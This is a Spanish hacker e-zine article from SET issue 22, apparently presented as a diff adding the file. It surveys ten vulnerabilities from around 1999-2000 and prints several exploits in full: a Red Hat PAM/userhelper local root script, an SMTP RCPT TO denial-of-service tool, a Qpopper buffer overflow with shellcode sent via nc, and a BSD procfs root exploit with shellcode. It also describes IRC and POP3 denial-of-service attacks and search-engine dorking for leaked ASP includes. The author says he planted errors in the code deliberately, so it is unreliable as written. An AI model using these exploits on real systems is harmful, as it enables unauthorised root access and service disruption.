@@ -1,0 +1,747 @@
+-[ 0x09 ]--------------------------------------------------------------------
+-[ The Bugs ToP 10 ]---------------------------------------------------------
+-[ by Krip7iK ]-------------------------------------------------------SET-22-
+
+
+
+
+               --=([         The Bugs ToP 10         ])=--
+                             ===============     
+
+
+
+
+Cogiendo el relevo de Falken parece que a partir de ahora y por tiempo
+indefinido me encargare de esta seccion, asi que procurare hacerlo tan
+bien como estaba hasta la fecha...
+
+Como comenzo a ser costumbre desde hace ya unos numeros, los exploits que
+aqui se peguen no seran operativos a no ser que os los leais y encontreis
+el fallo que introducimos. Esto es simplemente una medida de seguridad
+frente a script-kiddies, de modo que lo que habra que corregir usualmente
+sera algo extremadamente sencillo para cualquiera con conocimientos medios
+en seguridad y/o programacion.
+
+Sin mas dilacion comencemos con una seleccion de los bugs que han salido
+en el ultimo periodo entre SET21 y SET22. Estos son los que bajo mi
+humilde punto de vista son mas curiosos, de importancia, y/o interesantes
+desde el punto de vista tecnico.
+
+Ahi van:
+
+
+-( 0x01 )-
+
+Tema     : PAM/USERHELPER
+Para     : Red Hat Linux 6.0
+Patch    : Actualizaciones de PAM y USERHELPER
+Creditos : Dildog (L0pth)
+
+
+Descripcion y Notas:
+
+Se dice que Red Hat es una de las distribuciones que mas bugs sufre, bien,
+pues hacia mucho que no aparecia un bug tan serio como este para Red Hat.
+El bug parece afectar a las versiones 6.x, y con un simple exploit podemos
+lograr obtener a partir de una cuenta sin ningun tipo de privilegios,
+ejecutar una shell como root.
+
+El bug se limita simplemente a una conjuncion de "malos habitos" de este
+par de programitas. Tanto PAM como Userhelper siguen rutas "..", si a
+esto a~adimos que USERHELPER esta marcado como SUID, tenemos una situacion
+bastante apta para hacernos root. Lo que hace el exploit es lanzar un
+programa con userhelper -w, con lo cual se ejecuta con los privilegios que
+PAM le designe. En principio solo podriamos lanzar programas que esten en:
+/etc/security/console.apps, pero haciendo uso de "..", podriamos llegar a
+cualquier lugar del disco duro:
+/etc/security/console.apps/../../../home/krip7ik/fuck por ejemplo.
+
+Con PAM pasa algo similar siendo en este caso la ruta /etc/pam.d/.
+
+Teniendo en cuenta esto, solo queda presentar el exploit escrito por
+"dildog". Comentar lo elegante del exploit escrito en forma de script que
+genera un ejecutable necesario para explotar el bug.
+
+<++> bugs/pamslam
+#!/bin/sh
+#
+# pamslam - vulnerability in Redhat Linux 6.1 and PAM pam_start
+# found by dildog@l0pht.com
+#
+# synopsis:
+#      both 'pam' and 'userhelper' (a setuid binary that comes with the
+#      'usermode-1.15' rpm) follow .. paths. Since pam_start calls down to
+#      _pam_add_handler(), we can get it to dlopen any file on disk.
+'userhelper'
+#      being setuid means we can get root.
+#
+# fix:
+#      No fuckin idea for a good fix. Get rid of the .. paths in
+userhelper
+#      for a quick fix. Remember 'strcat' isn't a very good way of
+confining
+#      a path to a particular subdirectory.
+#
+# props to my mommy and daddy, cuz they made me drink my milk.
+
+cat > _pamslam.c << EOF
+
+#include<stdlib.h>
+#include<unistd.h>
+#include<sys/types.h>
+void _init(void)
+{
+      setuid(geteuid());
+      system("/bin/sh");
+}
+EOF
+
+echo -n .
+
+echo -e auth\\trequired\\t$PWD/_pamslam.so > _pamslam.conf
+chmod 755 _pamslam.conf
+
+echo -n .
+gdc -fPIC -o _pamslam.o -c _pamslam.c
+
+echo -n o
+
+ld -shared -o _pamslam.so _pamslam.o
+
+echo -n o
+
+chmod 755 _pamslam.so
+
+echo -n O
+
+rm _pamslam.c
+rm _pamslam.o
+
+echo O
+
+/usr/sbin/userhelper -w ../../..$PWD/_pamslam.conf
+
+sleep 1s
+
+rm _pamslam.so
+rm _pamslam.conf
+<-->
+
+Mas informacion: dildog@l0pth.com
+
+Soluciones:
+
+Actualizar los paquetes: usermode, pam, SysVinit.
+
+ftp://updates.redhat.com/6.1/
+
+
+-( 0x02 )-
+
+Tema     : Corel Update SUID bug 
+Para     : COREL Linux
+Patch    : Eliminar el SUID o modificar ligeramente get_it
+Creditos : Cesar Tascon Alvarez
+
+
+Explicacion:
+
+El bug detectado es bastante simple pero a la vez con grandes
+consecuencias. Con Corel Linux viene una aplicacion llamada Corel Update
+dedicada al control de archivos .deb. Este programa se encuentra como
+"get_it", en /usr/X11R6/bin, y esta como setuid root. La vulnerabilidad
+aparece cuando nos damos cuenta de que hace uso de "cp" sin usar la ruta
+completa, lo cual deriva en un compromiso del root.
+
+Para explotar el bug solo hay que crear un archivo "cp", que abra una
+shell con los privilegios que se ejecute, y cambiar el PATH para que se
+use por defecto este "cp" en lugar del original.
+
+En el advisory original aparecia un ejemplo, pero a mi juicio es lo
+suficientemente simple de generar como para que no valga la pena pegarlo. 
+
+
+
+Solucion:
+
+Eliminar el SUID o si nos sentimos con ganas modificar get_it para que use
+la ruta completa hacia cp.
+
+Mas informacion: tascon@enete.gui.uva.es
+
+
+-( 0x03 )-
+
+Tema     : DoS remoto 
+Para     : Internet Anywhere Mail Server Ver.3.1.3
+Patch    : No hay
+Creditos : Nobuo Miwa (moderador de Bugtraq-jp)
+
+Existen dos DoS en este servidor de mail:
+
+El primero se debe a algun fallo al realizar una conversion atoi() en el
+comando RETR. Ejemplo:
+
++OK POP3 Welcome to somewhere.domain using the Internet Anywhere
+    Mail Server Version: 3.1.3. Build: 1065 by True North Software,
+    Inc.
+    USER yellow
+    +OK valid
+    PASS pikapika
+    +OK Authorized
+    RETR 111111111111111111111111
+
+Y el segundo concierne al servicio del puerto 25, en el cual algun
+problema en la asignacion de memoria a las conexiones o algo similar, hace
+que muchas conexiones hagan que el servidor comience a rechazar
+connects(), si se hace varias veces puedes llegar a hacer que rechace
+cualquier conexion. Depende de la memoria del servidor, con lo cual no se
+pueden dar numeros generales, pero basicamente esa es la idea.
+
+
+
+-( 0x04 )-
+
+Tema     : lpd
+Para     : Red Hat Linux 4.x, 5.x, 6.x
+Patch    :  ftp://updates.redhat.com/6.1/i386/lpr-0.48-1.****.rpm
+Creditos : Dildog (L0pth)
+
+Algo que roza ya la fantasia... hackear por la impresora!! ;-)
+
+Este Bug es relativamente complicado de explotar, pero es o al menos seria
+posible hacerlo. Centrandonos en el bug, mas bien es un compendio de 4
+situaciones:
+
+1. LPD permite el acceso a sus servicios comparando el nombre de dominio
+con el que la maquina le envia de modo que si puedes modificar tu propio
+DNS y hacerlo coincidir con la maquina a atacar puedes hacerte con los
+servicios de LPD. 
+
+2. LPD te permite enviar cuantos ficheros quieras y del tipo que quieras
+(binarios, texto,...) al directorio de spool.
+
+3. LPD te permite especificar lo que quieras en el archivo de control
+(normalmente se llama cfXXXXXXXX en /var/spool/lpd/<printer>/), incluso
+hostnames y otras cosas que no existan.
+
+4. LPD te permite especificar un argumento en /usr/sbin/sendmail y
+ejecutarlo; esto se consigue diciendo a lpd que envie mail al propietario
+del trabajo de impresion cuando se termine (comando M en el archivo cf).
+Lo mejor es que el argumento que se pase a sendmail en la configuracion de
+lpd no tiene por que ser una direccion de email, sino que puede ser
+cualquier opcion que acepte sendmail como "-C<alternateconfigfilepath>".
+
+Juntando todo esto con cierta habilidad (especialmente el paso 4)
+podriamos incluso conseguir root... de modo remoto, y como quien dice a
+traves de la impresora!!!. Mas info en www.l0pth.com
+
+
+-( 0x05 )-
+
+Tema     : DoS IRCD's
+Para     : Diversos
+Patch    : ????
+Creditos : Pedro Reis ( Goblin )
+
+
+Descripcion:
+
+Diversos servers de irc se quedan colgados cuando alguien con un nombre de
+dominio muy largo intenta acceder a ellos. Algunos en los cuales el autor
+del advisory detecto este fallo son:
+
+        Elite ircd (versions unknown)
+        Ptlink ircd (all versions)
+        Undernet ircd (u.2.9.32)
+
+Versiones mas actuales se cree que no sufren este DoS, asi como otros
+servers.
+
+Como realizar el DoS... bien, si tienes un dominio propio y cambias el
+named.conf introduciendo un subdominio del tipo
+esto.eslomas.acojonantemente.largo.que.semeha.ocurrido.para.joder.dominio.es,
+luego reinicias named, y al intentar entrar en estos servers de irc,
+sufren un cuelgue cuando intentan resolver tu ip. Simple no??.
+
+
+-( 0x06 )-
+
+Tema     : Comer memoria con RCPT TO
+Para     : Netscape Messanger v 3.62
+Patch    : Actualizar ??
+Creditos : Novuo Miwa
+
+Este Bug es bastante antiguo ya, si tenemos en cuenta que 2 o 3 meses es
+muy antiguo, pero no se... me resulto atractivo.. quiza por ser para algo
+de Netscape (y no tengo nada contra ellos). Se trata de un claro ejemplo
+de mala gestion de la memoria, en la cual nos comemos la memoria mediante
+la introduccion de cadenas muyyyy largas en rcpt to:... ejemplo:
+
+220 victim.workgroup ESMTP server (Netscape Messaging Server -
+Version 3.62) ready Thu, 28 Oct 1999 12:13:17 +0900
+helo rcpt2
+250 victim.workgroup
+mail from : rcpt2
+250 Sender <rcpt2> Ok
+rcpt to: rcpt2@aaaaaaaaaaaaa............. 8000 bytes
+250 Recipient <rcpt2@aaaaaaaaaaaa....
+rcpt to: rcpt2@aaaaaaaaaaaaa............. 8000 bytes
+250 Recipient <rcpt2@aaaaaaaaaaaa....
+  ...
+  10,000 veces
+ .....
+
+El server se va quedando sin memoria, ademas nunca se libera, y si
+seguimos insistiendo lo colgaremos.
+
+A continuacion pego un exploit, el cual es para uso en VUESTRAS maquinas
+como es expreso deseo del autor... por si acaso (nos conocemos) lo
+modificare en algun sitio un pelin! ;-)
+
+<++> /bugs/netscape.c
+/***************************************************************
+ You can test "YOUR" Netscape Messaging Server 3.6SP2 for NT
+ whether vulnerable for too much RCPT TO or not.
+                  by Nobuo Miwa, LAC Japan  28th Oct. 1999
+                  http://www.lac.co.jp/security/
+****************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define    STR_HELO      "HELO rcpt2\n"
+#define    STR_MAILFROM  "MAIL FROM:rcpt2\n"
+#define    RCPT2_LENGTH  8000
+#define    RCPT2_NUMBER  10000
+
+int openSocket(struct sockaddr_in *si, char *hostIPaddr)
+{
+    int             port=25, sd, rt ;
+    long            li ;
+    struct hostent  *he;
+
+    si->sin_addr.s_addr = inet_addr(hostIPaddr);
+    si->sin_family      = AF_INET;
+    si->sin_port        = htons (port);
+    sd = socket (si->sin_family, SOCK_STREAM, 0);
+    if (sd == -1) return (-1);
+
+    rt = connect(sd,(struct sockaddr *)si,sizeof(struct sockaddr_in));
+    if ( rt < 0 ) {
+       close(sd);
+       return(-1);
+    }
+
+    return(sd) ;
+}
+
+void sendRCPT2(int sd)
+{
+    char    rcptStr[RCPT2_LENGTH], tmpStr[RCPT2_LENGTH+80], strn[80];
+    int     rt, i;
+
+    memset( tmpStr, 0, sizeof(tmpStr) ) ;
+    recv( sd, tmpStr, sizeof(tmpStr), 0 );
+    printf("%s",tmpStr);
+
+    printf("%s",STR_HELO);
+    send( sd, STR_HELO, strlen(STR_HELO), 0 );
+    memset( tmpStr, 0, sizeof(tmpStr) ) ;
+    rt = recv( sd, tmpStr, sizeof(tmpStr), 0 );
+    if ( rt>0 ) printf("%s",tmpStr);
+
+    printf("%s",STR_MAILFROM);
+    send(sd, STR_MAILFROM, strlen(STR_MAILFROM), 0);
+    memset( tmpStr, 0, sizeof(tmpStr) ) ;
+    rt = recv(sd, tmpStr, sizeof(tmpStr), 0);
+    if ( rt>0 ) printf("%s",tmpStr);
+   strcpy( rcptStr, "RCPT TO: rcpt2@" ) ;
+    while ( RCPT2_LENGTH-strlen(rcptStr)>10 )
+        strcat( rcptStr, "aaaaaaaaaa") ;
+    strcat( rcptStr, "\n" );
+    for ( i=0 ; i<RCPT2_NUMBER ; i++ ) {
+        printf("No.%d RCPT TO:rcpt2@aaa.. len %d\n",i,strlen(rcptStr));
+        send( sd, rcptStr, strlen(rcptStr), 0 );
+        rt = recv( sd, tmpStr, sizeof(tmpStr)-1, 0 );
+        strncpy( strn, tmpStr, 60 ) ;
+        if ( rt>0 ) printf("%s \n",strn);
+    }
+
+    return;
+}
+
+int main (int argc, char *argv[])
+{
+    char                 hostIPaddr[80], *cc, *pfft;
+    int                  sd = 0;
+    strukt sockaddr_in   si; // me molan las Ks !! ;)
+    printf("You can use ONLY for YOUR Messaging Server 3.6\n");
+    if (argc != 2) {
+        printf("Usage: %s IPaddress \n",argv[0]);
+        exit(1);
+    } else
+        strcpy (hostIPaddr, argv[1]);
+
+    sd = openSocket(&si,hostIPaddr);
+
+    if (sd < 1) {
+        printf("failed!\n");
+        exit(-1);
+    }
+
+    sendRCPT2( sd );
+    close (sd);
+
+    exit(0);
+}
+<-->
+-----------------------------------------
+
+Con la version 4.15 que ya debe estar funcionando queda arreglado este
+fallo asi como algunos mas, asi que la solucion a todo esto es simple...
+actualizar el soft.
+
+
+-( 0x07 )-
+
+Tema     : Buffer Overflow en el comando LIST
+Para     : Qpopper 3.0beta29 (2.53 y anteriores no)
+Patch    : ???
+Creditos : Zhodiac
+
+Bien... que decir de esto??.. poco hay que decir, simplemente que este tan
+utilizado server de pop3 sufre de un buffer overflow en el comando LIST,
+descubierto por nuestro colega Zhodiac (saludos si aun nos lees!!); este
+lo podeis comprobar haciendo uso del exploit escrito tambien por Zhodiac y
+que presento a continuacion:
+
+
+<++> /bugs/qpop-xploit.c
+/*
+ * !Hispahack Research Team
+ * http://hispahack.ccc.de
+ *
+ * By Zhodiac <zhodiac@softhome.net>
+ *
+ * Linux (x86) Qpopper xploit 3.0beta29 or lower (not 2.53)
+ * Overflow at pop_list()->pop_msg()
+ *
+ * Tested: 3.0beta28  offset=0
+ *         3.0beta26  offset=0
+ *         3.0beta25  offset=0
+ *
+ * #include <standar/disclaimer.h>
+ *
+ * This code is dedicated to my love [CrAsH]] and to all the people who
+ * were raided in Spain in the last few days.
+ *
+ *
+ * Madrid 10/1/2000
+ *
+ */
+
+#include <stdio.h>
+
+#define BUFFERSIZE 1004
+#define NOP 0x90
+#define OFFSET 0xbfffd9c4
+
+char shellcode[]=
+ "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa\x89\xf9\x89"
+ "\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04\x03\xcd\x80\x31\xdb\x89"
+ "\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff/bin/sh";
+
+
+void usage(char *progname) {
+ fprintf(stderr,"Usage: (%s <login> <password> [<offset>]; cat) | nc
+<target>
+110",progname);
+ exit(1);
+}
+
+int main(int argc, char **argv) {
+char *ptr,buffer[BUFFERSIZE];
+unsigned long *long_ptr,offset=OFFSET;
+int aux;
+
+ fprintf(stderr,"\n!Hispahack Research Team (http://hispahack.ccc.de)\n");
+ fprintf(stderr,"Qpopper xploit by Zhodiac <zhodiac@softhome.net>\n\n");
+
+ if (argc<3) usage(argv[0]);
+
+ if (argc==4) offset+=atol(argv[3]);
+
+ ptr=buffer;
+ memset(ptr,0,sizeof(buffer));
+ memset(ptr,NOP,sizeof(buffer)-strlen(shellcode)-16);
+ ptr+=sizeof(buffer)-strlen(shellcode)-16;
+ memcpy(ptr,shellcode,strlen(shellcode));
+ ptr+=strlen(shellcode);
+ long_ptr=(unsigned long*)ptr;
+ for(aux=0;aux<4;aux++) *(long_ptr++)=offset;
+ ptr=(char *)long_ptr;
+ *ptr='\0';
+
+ fprintf(stderr,"Buffer size: %d\n",strlen(buffer));
+ fprintf(stderr,"Offset: 0x%lx\n\n",offset);
+
+ printf("USE %s\n",argv[1]); //no os quejareis eh?!? (Krip)
+ sleep(1);
+ printf("PASS %s\n",argv[2]);
+ sleep(1);
+ printf("LIST 1 %s\n",buffer);  
+ sleep(1);
+ printf("uname -a; id\n");
+
+ return(0);
+}
+<-->
+
+
+
+-( 0x08 )-
+
+Tema     : Signed Software
+Para     : WINDOWS
+Patch    : No usar IE 4 ni 5 como se cuenta abajo...
+Creditos : Juan Carlos Garcia Cuartango
+
+Explicacion:
+
+En este caso mas que de un bug se trata de un compromiso de la seguridad
+de nuestra maquina y nuestros datos cuando usamos IE 4 o 5 con el control
+MS Active X llamado MS Active Setup, que en principio sirve para la
+instalacion de software de manera remota en la red.
+
+Esta aplicacion solo instala software autentificado, pero el problema
+surge cuando el software en cuestion es un producto de Microsoft, en cuyo
+caso no se pregunta ni se avisa de su instalacion, y este software es
+instalado de modo silencioso y el usuario no se percata de ello. Como es
+logico esto puede ser usado de modo muy perjudicial para la privacidad de
+los usuarios de este componente de MS Internet Explorer.
+
+Una demostracion de esto nos la presenta Cuartango en:
+http://www.angelfire.com/ab/juan123/iengine.html
+
+e informacion sobre Active Setup en:
+http://msdn.microsoft.com/library/periodic/period98/vbpj0798.htm
+
+
+-( 0x09 )-
+
+Tema     : procfs bug/exploit
+Para     : *BSD
+Patch    :  http://www.openbsd.org/errata.html#procfs
+            ftp.freebsd.org/pub/FreeBSD/CERT/patches/SA-00:02/procfs.patch
+Creditos : Rafal Wojtczuk <nergal@avet.com.pl>
+
+
+Hace unos a~os (Enero de 1997), se discutio en los foros de seguridad
+sobre un bug similar, en el que por medio de la escritura en
+/proc/pid/mem, un exploit podria darnos root. Desde entonces todos los
+*BSD llevaban en el kernel un patch que se suponia eliminaba esta
+posibilidad, pero como aqui os voy a mostrar esto no ha sido asi, si bien
+ahora el modo de explotarlo es algo mas complicado.
+
+Este bug afecta a las plataformas *BSD (FreeBSD y OpenBSD) actuales y
+anteriores, si bien hay que decir que mientras en FreeBSD 3.3 procfs ES
+MONTADO por defecto en OpenBSD 2.6 no. Aun asi, si como administradores
+hemos decidido montarlo nuestra makina contendra dicha vulnerabilidad.
+
+Para entender el actual exploit remitamosnos al fallo anterior y a la
+solucion que se le dio. En aquel fallo lo que ocurria era basicamente que
+un proceso A, podia escribir en el /proc/pid-de-B/mem, y asi controlar su
+memoria, si B ejecutaba un suid, cambiaba de euid y seguiriamos
+controlando desde A (con menos privilegios) su ejecucion a traves de su
+memoria. Para arreglarlo se incluyo un chequeo adicional en la parte
+responsable del acceso a los descriptores de los pseudo ficheros del
+procfs. Esto es lo que se encuentra en miscfs/procfs/procfs.h (FreeBSD 3.0):
+
+/*
+ * Check to see whether access to target process is allowed
+ * Evaluates to 1 if access is allowed.
+ */
+#define CHECKIO(p1, p2) \
+     ((((p1)->p_cred->pc_ucred->cr_uid == (p2)->p_cred->p_ruid) && \
+       ((p1)->p_cred->p_ruid == (p2)->p_cred->p_ruid) && \
+       ((p1)->p_cred->p_svuid == (p2)->p_cred->p_ruid) && \
+       ((p2)->p_flag & P_SUGID) == 0) || \
+      (suser((p1)->p_cred->pc_ucred, &(p1)->p_acflag) == 0))
+
+Bien, de aqui lo unico que deducimos es que el proceso p1 debe tener o
+privilegios de root o ser el mismo uid que p2 para poder acceder a sus
+descriptores. Por tanto la unica manera ahora de explotar esto es a traves
+de algun setuid root. Si enga~amos a un suid root para que escriba en un
+descriptor F que apunta a un objeto de procfs, podremos escribir de nuevo
+codigo arbitrario en cualquier /proc/pid/mem. La manera que se ha ideado
+es a traves del descriptor no. 2 (stderr). Si a un SUID le pasamos un
+stderr apuntando de manera adecuada a un /proc/pid/mem, podremos de nuevo
+realizar un exploit en el cual escribiendo en la memoria de un proceso
+conseguir privilegios de root, simplemente controlando los mensajes de
+error que escriba el programa (los cuales son hasta cierto punto
+controlables). 
+
+En el exploit que se prsenta a continuacion se usa /usr/bin/passwd como
+SUID para nuestro fin, aunque casi cualquier otro SUID serviria.
+
+---------
+<++> /bugs/procfs.c
+/* by Nergal */
+#include <errno.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>  
+#include <string.h>
+#include <signal.h>
+#include <sys/wait.h>
+
+char            shellcode[] =
+"\xeb\x0a\x62\x79\x20\x4e\x65\x72\x67\x61\x6c\x20"
+"\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+"\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+"\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+"\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04\x00";
+
+#define PASSWD "./passwd"
+void
+sg(int x)
+{
+}
+int
+main(int argc, char **argv)
+{
+        unsigned int stack, shaddr  //script-kiddies SUX!
+        int             pid,schild;
+        int             fd;
+        char            buff[40];
+        unsigned int    status;
+        char            *ptr;
+        char            name[4096];
+        char            sc[4096];
+        char            signature[] = "signature";
+
+        signal(SIGUSR1, sg);
+if (symlink("usr/bin/passwd",PASSWD) && errno!=EEXIST)
+{
+perror("creating symlink:");
+exit(1);
+}
+        shaddr=(unsigned int)&shaddr;
+        stack=shaddr-2048;
+        if (argc>1)
+        shaddr+=atoi(argv[1]);
+        if (argc>2)
+        stack+=atoi(argv[2]);
+        fprintf(stderr,"shellcode addr=0x%x stack=0x%x\n",shaddr,stack);
+        fprintf(stderr,"Wait for \"Press return\" prompt:\n");
+        memset(sc, 0x90, sizeof(sc));
+        strncpy(sc+sizeof(sc)-strlen(shellcode)-1,
+shellcode,strlen(shellcode));
+        strncpy(sc,"EGG=",4);
+memset(name,'x',sizeof(name));
+        for (ptr = name; ptr < name + sizeof(name); ptr += 4)
+                *(unsigned int *) ptr = shaddr;
+        name[sizeof(name) - 1] = 0;
+
+        pid = fork();
+        switch (pid) {
+        case -1:
+                perror("fork");
+                exit(1);
+        case 0:
+                pid = getppid();
+                sprintf(buff, "/proc/%d/mem", pid);
+                fd = open(buff, O_RDWR);
+                if (fd < 0) {
+                        perror("open procmem");
+                        wait(NULL);
+                        exit(1);
+                }
+                /* wait for child to execute suid program */
+                kill(pid, SIGUSR1);
+                do {
+                        lseek(fd, (unsigned int) signature, SEEK_SET);
+                } while
+                        (read(fd, buff, sizeof(signature)) ==
+sizeof(signature)
+&&
+                         !strncmp(buff, signature, sizeof(signature)));
+                lseek(fd, stack, SEEK_SET);
+                switch (schild = fork()) {
+                case -1:
+                        perror("fork2");
+                        exit(1);
+                case 0:
+
+                        dup2(fd, 2);
+                        sleep(2);
+                        execl(PASSWD, name, "blahblah", 0);
+                        printf("execl failed\n");
+                        exit(1);
+                default:
+                        waitpid(schild, &status, 0);
+                }
+                fprintf(stderr, "\nPress return.\n");
+                exit(1);
+        default:
+                /* give parent time to open /proc/pid/mem */
+                pause();
+                putenv(sc);
+                execl(PASSWD, "passwd", NULL);
+                perror("execl");
+                exit(0);
+
+        }
+}
+<-->
+
+
+Solucion: Mirar los Patch un poco mas arriba!.
+
+
+-( 0x10 )-
+
+Tema     : Runtime Errors en ASPs
+Para     : ASPs
+Patch    : Chequear bien los ASPs antes de publicarlos.
+Creditos : Jerry Walsh jwalsh@jwsg.com
+
+ Descripcion:
+
+Aqui lo que nos encontramos es con un fallo de seguridad a traves del cual
+podemos conseguir averiguar informacion que podria comprometer seriamente
+la seguridad de algunas maquinas. El fallo reside en los ASPs (Active
+Server Pages) que tengan algun runtime error. Si estos scripts llegan a
+publicarse en la internet cualquier motor de busqueda nos los indexara en
+cuanto hagamos una busqueda. Tras encontrar su ruta, solo tendremos que
+acceder al archivo en cuestion desde nuestro navegador y tendremos ante
+nosotros informacion de primera mano. 
+
+El modo de proceder a modo de ejemplo seria:
+
+1) En ALTAVISTA: +"Microsoft VBScript runtime error" +".inc, "
+
+2) En los resultados seleccionar los que incluyan el path y nombre de
+algun include (.inc)
+
+3) Verlo en el navegador... p.e. www.patan.es/includes/nodebug.inc 
+
+Solucion... tener cuidado con lo que se publica!.
+
+----
+
+Bien, como veis en este numero hay bastante presencia de bugs descubiertos
+por gente de nuestro pais (esp~a). Ademas bugs bastante serios al menos
+bajo mi punto de vista. Como conclusion... la seguridad informatica en
+espa~a empieza a moverse rapido!!, lo cual da esperanza, pero no hay que
+despistarse... "no todo el monte es oregano".
+
+Salu2, en SET 23 mas Bugs!.
+
+*EOF*
